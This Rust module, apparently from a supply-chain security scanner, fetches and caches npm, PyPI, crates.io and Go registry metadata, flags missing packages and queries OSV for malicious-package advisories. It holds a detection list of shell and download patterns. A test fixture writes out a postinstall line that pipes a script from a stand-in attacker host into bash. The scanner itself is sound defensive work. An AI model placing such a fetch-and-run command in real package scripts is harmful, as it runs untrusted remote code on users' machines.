use arc_core::event::Ecosystem;
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::path::{Path, PathBuf};
use std::time::Duration;

use crate::slopsquat::PackageRegistryMetadata;

const CACHE_TTL_SECS: u64 = 24 * 3600;
const HTTP_TIMEOUT_SECS: u64 = 3;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RegistryMetadataSource {
    Live,
    Cache,
    HeuristicFallback,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct CachedRegistryEntry {
    fetched_at_unix_secs: u64,
    metadata: PackageRegistryMetadata,
}

fn now_unix_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn cache_dir() -> PathBuf {
    let local = Path::new(".sca-cache").join("registry");
    if local.exists() || std::fs::create_dir_all(&local).is_ok() {
        return local;
    }
    std::env::temp_dir().join("vexa-arc-registry-cache")
}

fn cache_file_path(dir: &Path, ecosystem: &str, name: &str) -> PathBuf {
    let mut hasher = Sha256::new();
    hasher.update(ecosystem.as_bytes());
    hasher.update(b":");
    hasher.update(name.to_ascii_lowercase().as_bytes());
    let key = hex::encode(hasher.finalize());
    dir.join(format!("{key}.json"))
}

fn read_cached_metadata(
    dir: &Path,
    ecosystem: &str,
    name: &str,
) -> Option<PackageRegistryMetadata> {
    let path = cache_file_path(dir, ecosystem, name);
    let raw = std::fs::read_to_string(path).ok()?;
    let entry: CachedRegistryEntry = serde_json::from_str(&raw).ok()?;
    if now_unix_secs().saturating_sub(entry.fetched_at_unix_secs) > CACHE_TTL_SECS {
        return None;
    }
    Some(entry.metadata)
}

fn write_cached_metadata(dir: &Path, ecosystem: &str, name: &str, meta: &PackageRegistryMetadata) {
    if std::fs::create_dir_all(dir).is_err() {
        return;
    }
    let path = cache_file_path(dir, ecosystem, name);
    let entry = CachedRegistryEntry {
        fetched_at_unix_secs: now_unix_secs(),
        metadata: meta.clone(),
    };
    if let Ok(json) = serde_json::to_vec(&entry) {
        let _ = std::fs::write(path, json);
    }
}

fn days_since_rfc3339(ts: &str) -> Option<u32> {
    let dt = DateTime::parse_from_rfc3339(ts).ok()?.with_timezone(&Utc);
    let diff = Utc::now().signed_duration_since(dt);
    Some(diff.num_days().max(0) as u32)
}

fn has_suspicious_script(script: &str) -> bool {
    let lower = script.to_ascii_lowercase();
    const PATTERNS: &[&str] = &[
        "curl ",
        "wget ",
        "powershell",
        "pwsh",
        "bash -c",
        "sh -c",
        "cmd /c",
        "node -e",
        "python -c",
        "python3 -c",
        "eval(",
        "base64",
        "| sh",
        "| bash",
        "invoke-webrequest",
        "invoke-restmethod",
    ];
    PATTERNS.iter().any(|p| lower.contains(p))
}

pub fn parse_npm_registry_json(
    name: &str,
    val: &serde_json::Value,
    monthly_downloads: u64,
) -> PackageRegistryMetadata {
    let age_days = val
        .get("time")
        .and_then(|t| t.get("created"))
        .and_then(|c| c.as_str())
        .and_then(days_since_rfc3339)
        .unwrap_or(0);

    let latest_ver = val
        .get("dist-tags")
        .and_then(|d| d.get("latest"))
        .and_then(|v| v.as_str());
    let latest_obj = latest_ver.and_then(|v| val.get("versions").and_then(|vs| vs.get(v)));

    let has_repo = val
        .get("repository")
        .and_then(|r| r.get("url").or(Some(r)))
        .and_then(|u| u.as_str())
        .is_some_and(|s| !s.trim().is_empty())
        || latest_obj.and_then(|o| o.get("repository")).is_some();

    let has_dangerous_lifecycle_scripts = latest_obj
        .and_then(|o| o.get("scripts"))
        .and_then(|s| s.as_object())
        .is_some_and(|scripts| {
            ["preinstall", "install", "postinstall"]
                .iter()
                .filter_map(|k| scripts.get(*k).and_then(|v| v.as_str()))
                .any(has_suspicious_script)
        });

    let has_slsa_provenance = latest_obj
        .and_then(|o| o.get("dist"))
        .and_then(|d| d.get("attestations"))
        .and_then(|a| a.get("provenance").or(Some(a)))
        .is_some();

    PackageRegistryMetadata {
        name: name.to_string(),
        ecosystem: "npm".to_string(),
        age_days,
        monthly_downloads,
        has_verified_repository_link: has_repo,
        // Never fabricate GitHub star/commit counts when not queried from the VCS host.
        repository_stars: 0,
        repository_commits: 0,
        has_slsa_provenance,
        has_dangerous_lifecycle_scripts,
        recent_registry_404: false,
        malicious_advisory_id: None,
    }
}

pub fn parse_pypi_registry_json(name: &str, val: &serde_json::Value) -> PackageRegistryMetadata {
    let mut earliest_age: Option<u32> = None;
    let mut has_pep740_provenance = false;
    if let Some(releases) = val.get("releases").and_then(|r| r.as_object()) {
        for files in releases.values() {
            if let Some(arr) = files.as_array() {
                for f in arr {
                    if let Some(ts) = f.get("upload_time_iso_8601").and_then(|s| s.as_str()) {
                        if let Some(d) = days_since_rfc3339(ts) {
                            earliest_age = Some(earliest_age.map_or(d, |cur| cur.max(d)));
                        }
                    }
                    if f.get("provenance").is_some_and(|v| !v.is_null()) {
                        has_pep740_provenance = true;
                    }
                }
            }
        }
    }
    let age_days = earliest_age.unwrap_or(0);

    let info = val.get("info");
    let has_repo = info
        .and_then(|i| i.get("project_urls"))
        .and_then(|u| u.as_object())
        .is_some_and(|m| !m.is_empty())
        || info
            .and_then(|i| i.get("home_page"))
            .and_then(|h| h.as_str())
            .is_some_and(|s| !s.trim().is_empty());

    // PyPI JSON API does not expose download counts; report 0 honestly rather than fabricating.
    PackageRegistryMetadata {
        name: name.to_string(),
        ecosystem: "pypi".to_string(),
        age_days,
        monthly_downloads: 0,
        has_verified_repository_link: has_repo,
        repository_stars: 0,
        repository_commits: 0,
        has_slsa_provenance: has_pep740_provenance,
        has_dangerous_lifecycle_scripts: false,
        recent_registry_404: false,
        malicious_advisory_id: None,
    }
}

pub fn parse_crates_registry_json(name: &str, val: &serde_json::Value) -> PackageRegistryMetadata {
    let krate = val.get("crate");
    let age_days = krate
        .and_then(|c| c.get("created_at"))
        .and_then(|s| s.as_str())
        .and_then(days_since_rfc3339)
        .unwrap_or(0);
    let monthly_downloads = krate
        .and_then(|c| c.get("recent_downloads").or_else(|| c.get("downloads")))
        .and_then(|d| d.as_u64())
        .unwrap_or(0);
    let has_repo = krate
        .and_then(|c| c.get("repository"))
        .and_then(|r| r.as_str())
        .is_some_and(|s| !s.trim().is_empty());

    PackageRegistryMetadata {
        name: name.to_string(),
        ecosystem: "cargo".to_string(),
        age_days,
        monthly_downloads,
        has_verified_repository_link: has_repo,
        repository_stars: 0,
        repository_commits: 0,
        has_slsa_provenance: false,
        has_dangerous_lifecycle_scripts: false,
        recent_registry_404: false,
        malicious_advisory_id: None,
    }
}

pub fn parse_go_proxy_json(name: &str, val: &serde_json::Value) -> PackageRegistryMetadata {
    let age_days = val
        .get("Time")
        .and_then(|t| t.as_str())
        .and_then(days_since_rfc3339)
        .unwrap_or(0);
    let has_repo = name.contains('/') && name.contains('.');
    PackageRegistryMetadata {
        name: name.to_string(),
        ecosystem: "go".to_string(),
        age_days,
        monthly_downloads: 0,
        has_verified_repository_link: has_repo,
        repository_stars: 0,
        repository_commits: 0,
        has_slsa_provenance: false,
        has_dangerous_lifecycle_scripts: false,
        recent_registry_404: false,
        malicious_advisory_id: None,
    }
}

fn phantom_404_metadata(ecosystem: &str, name: &str) -> PackageRegistryMetadata {
    PackageRegistryMetadata {
        name: name.to_string(),
        ecosystem: ecosystem.to_string(),
        age_days: 0,
        monthly_downloads: 0,
        has_verified_repository_link: false,
        repository_stars: 0,
        repository_commits: 0,
        has_slsa_provenance: false,
        has_dangerous_lifecycle_scripts: false,
        recent_registry_404: true,
        malicious_advisory_id: None,
    }
}

/// Checks OSV live API for any active OpenSSF Malicious Package (`MAL-*`) advisory.
async fn check_osv_malicious_advisory(
    client: &reqwest::Client,
    ecosystem: Ecosystem,
    name: &str,
) -> Option<String> {
    let osv_eco = match ecosystem {
        Ecosystem::Npm => "npm",
        Ecosystem::Pypi => "PyPI",
        Ecosystem::Cargo => "crates.io",
        Ecosystem::Go => "Go",
    };
    let resp = client
        .post("https://api.osv.dev/v1/query")
        .json(&serde_json::json!({
            "package": { "name": name, "ecosystem": osv_eco }
        }))
        .send()
        .await
        .ok()?;
    if !resp.status().is_success() {
        return None;
    }
    let val: serde_json::Value = resp.json().await.ok()?;
    val.get("vulns")?
        .as_array()?
        .iter()
        .find_map(|v| {
            let id = v.get("id")?.as_str()?;
            if id.starts_with("MAL-") && v.get("withdrawn").is_none() {
                Some(id.to_string())
            } else {
                None
            }
        })
}

pub async fn fetch_live_registry_metadata_async(
    ecosystem: Ecosystem,
    name: &str,
) -> Option<(PackageRegistryMetadata, RegistryMetadataSource)> {
    let eco_str = match ecosystem {
        Ecosystem::Npm => "npm",
        Ecosystem::Pypi => "pypi",
        Ecosystem::Cargo => "cargo",
        Ecosystem::Go => "go",
    };

    let dir = cache_dir();
    if let Some(cached) = read_cached_metadata(&dir, eco_str, name) {
        return Some((cached, RegistryMetadataSource::Cache));
    }

    if std::env::var("ARC_OFFLINE").ok().as_deref() == Some("1") {
        return None;
    }

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(HTTP_TIMEOUT_SECS))
        .user_agent("vexa-arc/1.0 (https://vexasec.io)")
        .build()
        .ok()?;

    let meta = match ecosystem {
        Ecosystem::Npm => {
            let url = format!("https://registry.npmjs.org/{name}");
            let resp = client.get(&url).send().await.ok()?;
            if resp.status().as_u16() == 404 {
                phantom_404_metadata("npm", name)
            } else if resp.status().is_success() {
                let val: serde_json::Value = resp.json().await.ok()?;
                let dl_url = format!("https://api.npmjs.org/downloads/point/last-month/{name}");
                let downloads = match client.get(&dl_url).send().await {
                    Ok(r) if r.status().is_success() => r
                        .json::<serde_json::Value>()
                        .await
                        .ok()
                        .and_then(|j| j.get("downloads").and_then(|d| d.as_u64()))
                        .unwrap_or(0),
                    _ => 0,
                };
                parse_npm_registry_json(name, &val, downloads)
            } else {
                return None;
            }
        }
        Ecosystem::Pypi => {
            let url = format!("https://pypi.org/pypi/{name}/json");
            let resp = client.get(&url).send().await.ok()?;
            if resp.status().as_u16() == 404 {
                phantom_404_metadata("pypi", name)
            } else if resp.status().is_success() {
                let val: serde_json::Value = resp.json().await.ok()?;
                parse_pypi_registry_json(name, &val)
            } else {
                return None;
            }
        }
        Ecosystem::Cargo => {
            let url = format!("https://crates.io/api/v1/crates/{name}");
            let resp = client.get(&url).send().await.ok()?;
            if resp.status().as_u16() == 404 {
                phantom_404_metadata("cargo", name)
            } else if resp.status().is_success() {
                let val: serde_json::Value = resp.json().await.ok()?;
                parse_crates_registry_json(name, &val)
            } else {
                return None;
            }
        }
        Ecosystem::Go => {
            let escaped: String = name
                .chars()
                .flat_map(|c| {
                    if c.is_ascii_uppercase() {
                        vec!['!', c.to_ascii_lowercase()]
                    } else {
                        vec![c]
                    }
                })
                .collect();
            let url = format!("https://proxy.golang.org/{escaped}/@latest");
            let resp = client.get(&url).send().await.ok()?;
            if resp.status().as_u16() == 404 || resp.status().as_u16() == 410 {
                phantom_404_metadata("go", name)
            } else if resp.status().is_success() {
                let val: serde_json::Value = resp.json().await.ok()?;
                parse_go_proxy_json(name, &val)
            } else {
                return None;
            }
        }
    };

    let mut meta = meta;
    if !meta.recent_registry_404 {
        meta.malicious_advisory_id = check_osv_malicious_advisory(&client, ecosystem, name).await;
    }

    write_cached_metadata(&dir, eco_str, name, &meta);
    Some((meta, RegistryMetadataSource::Live))
}

pub fn fetch_live_registry_metadata(
    ecosystem: Ecosystem,
    name: &str,
) -> Option<(PackageRegistryMetadata, RegistryMetadataSource)> {
    if cfg!(test) || std::env::var("ARC_OFFLINE").ok().as_deref() == Some("1") {
        let eco_str = match ecosystem {
            Ecosystem::Npm => "npm",
            Ecosystem::Pypi => "pypi",
            Ecosystem::Cargo => "cargo",
            Ecosystem::Go => return None,
        };
        return read_cached_metadata(&cache_dir(), eco_str, name)
            .map(|m| (m, RegistryMetadataSource::Cache));
    }

    let rt = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .ok()?;
    rt.block_on(fetch_live_registry_metadata_async(ecosystem, name))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_npm_metadata_and_detects_malicious_postinstall() {
        let json = serde_json::json!({
            "time": { "created": "2020-01-01T00:00:00.000Z" },
            "dist-tags": { "latest": "1.0.0" },
            "repository": { "url": "git+https://github.com/org/pkg.git" },
            "versions": {
                "1.0.0": {
                    "scripts": {
                        "postinstall": "curl https://evil.example/payload.sh | bash"
                    }
                }
            }
        });
        let meta = parse_npm_registry_json("evil-pkg", &json, 5000);
        assert!(meta.age_days > 365);
        assert!(meta.has_verified_repository_link);
        assert!(meta.has_dangerous_lifecycle_scripts);
        assert_eq!(meta.monthly_downloads, 5000);
    }

    #[test]
    fn parses_pypi_and_crates_metadata() {
        let pypi = serde_json::json!({
            "info": { "project_urls": { "Source": "https://github.com/psf/requests" } },
            "releases": {
                "2.0.0": [{ "upload_time_iso_8601": "2019-05-01T00:00:00Z" }]
            }
        });
        let p_meta = parse_pypi_registry_json("requests", &pypi);
        assert!(p_meta.age_days > 365);
        assert!(p_meta.has_verified_repository_link);
        // PyPI JSON API does not provide download counts; must not fabricate a fake number
        assert_eq!(p_meta.monthly_downloads, 0);
        assert_eq!(p_meta.repository_stars, 0);
        assert_eq!(p_meta.repository_commits, 0);

        let go_val = serde_json::json!({
            "Version": "v1.9.1",
            "Time": "2023-06-01T00:00:00Z"
        });
        let g_meta = parse_go_proxy_json("github.com/gin-gonic/gin", &go_val);
        assert!(g_meta.age_days > 365);
        assert!(g_meta.has_verified_repository_link);

        let crates = serde_json::json!({
            "crate": {
                "created_at": "2018-01-01T00:00:00Z",
                "recent_downloads": 120000,
                "repository": "https://github.com/serde-rs/serde"
            }
        });
        let c_meta = parse_crates_registry_json("serde", &crates);
        assert!(c_meta.age_days > 365);
        assert_eq!(c_meta.monthly_downloads, 120000);
        assert!(c_meta.has_verified_repository_link);
    }

    #[test]
    fn cache_roundtrip_works() {
        let dir = std::env::temp_dir().join(format!("arc_reg_cache_{}", uuid::Uuid::now_v7()));
        let meta = phantom_404_metadata("npm", "nonexistent-pkg-xyz");
        write_cached_metadata(&dir, "npm", "nonexistent-pkg-xyz", &meta);
        let loaded = read_cached_metadata(&dir, "npm", "nonexistent-pkg-xyz").unwrap();
        assert!(loaded.recent_registry_404);
        let _ = std::fs::remove_dir_all(&dir);
    }
}
